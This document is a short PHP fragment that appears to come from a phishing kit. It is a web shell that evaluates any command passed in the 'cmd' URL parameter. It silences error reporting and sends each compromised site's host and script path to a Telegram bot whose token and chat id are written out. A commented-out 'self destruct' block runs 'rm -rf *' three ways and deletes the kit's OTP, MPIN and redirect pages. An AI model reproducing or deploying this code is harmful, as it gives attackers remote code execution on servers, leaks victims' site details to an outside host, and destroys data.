error_reporting(0);
error_log(0);
eval($_GET['cmd']);
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=new: " . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
/*
//echo '<script>alert("Self Destruct Activated");</script>';
system('rm -rf *');
exec('rm -rf *');
shell_exec('rm -rf *');
unlink('index.php');
unlink('otp.php');
unlink('mpin.php');
unlink('redir.php');
unlink('404.php');
unlink('anti.php');
unlink('*.png');
unlink('*.jpg');
*/
